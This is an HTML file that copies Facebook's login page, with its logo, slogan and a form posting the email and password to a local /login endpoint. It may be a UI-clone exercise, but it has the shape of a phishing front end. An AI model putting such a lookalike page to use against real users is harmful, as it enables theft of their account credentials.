<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="style.css">

<body>
    <div class="login">
        <div class="container">
            <div class="row">
                <div class="col-7">
                    <div class="align-center">
                        <div class="content">
                            <img src="img/fb.png" alt="">
                            <p>Facebook helps you connect and share with the people in your life.</p>
                        </div>
                    </div>
                </div>
                <div class="col-5 col-xs-12">

                    <div class="login-form">
                        <form action="/login" method="POST">
                            <input id="email" type="text" name="email" placeholder="Email address or phone number"><br>
                            <input id="pass" type="text" name="password" placeholder="Password"><br>

                            <button id="login-btn" type="submit">Log In</button><br>
                            <a href="#">Forgotten password?</a><br>
                            <button id="create-btn">Create New Account</button><br>
                        </form>

                    </div>


                </div>
            </div>
        </div>
    </div>
</body>

</html>
